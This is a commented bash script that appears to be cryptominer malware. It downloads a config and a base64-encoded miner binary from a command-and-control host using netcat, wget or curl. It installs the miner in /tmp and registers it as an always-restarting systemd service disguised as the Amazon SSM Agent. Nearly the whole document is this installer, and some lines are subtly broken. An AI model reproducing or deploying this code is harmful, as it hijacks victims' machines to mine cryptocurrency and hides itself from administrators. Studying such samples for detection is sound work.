language: bash
# This function writes the service file to the system that will be used to run the miner
function write_srv() {
    # This miner is a systemd service disguised as the Amazon SSM agent
    echo "[Unit]
Description=Amazon SSM Agent
[Service]
Type=simple
# It is run with the first argument being the C2 server and the second argument being the port
ExecStart=/tmp/amazon-ssm-agent $1 $2 $3
# The service is set to restart always so the miner will always be running
Restart=always
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/amazon-ssm-agent.service
}

# This function initializes the miner by pulling the config file and miner binary from the C2 server
function initminer() {
    # First the architecture of the system is determined
    rch=$(uname -p)
    if [ "$rch" == "x86_64" ]; then
        rch="amd64"
    fi

    # A config file is pulled from port 7777 on the C2 server via netcat and saved to /tmp/config.json
    cfig=/tmp/config.json
    nc $1 -p 7777 >> $cfig &
    export $cfig

    # The miner binary is pulled from the C2 server via wget or curl
    url="http://$1:$2/$rch"

    # The miner binary is saved to the environment variable $xmrbin so it can be used later in the script
    xmrbin=$(wget $url || curl $url)
    export $xmrbin
}

# Excution starts here. This first action is to update the system and install the required packages
apt-get update && apt-get install -y wget curl nc
# The miner is initialized using the first two arguments as the C2 server and port that were passed to the script when it was run
initminer $1 $2 
# The miner binary is decoded with base64 and saved to /tmp/amazon-ssm-agent and made executable
echo "$xmrbin" | base64 -d >> /tmp/amazon-ssm-agent
chmod +x /tmp/amazon-ssm-agent
# The service file is written to the system using the C2 server and port as the first two arguments and the config file as the third argument
write_srv $1 $2 $cfig
# The service is reloaded and started
systemctl daemon-reload
# The service is enabled and started
systemctl enable amazon-ssm-agent
systemctl start amazon-ssm-agent
# The status of the service is printed to the screen
systemctl status amazon-ssm-agent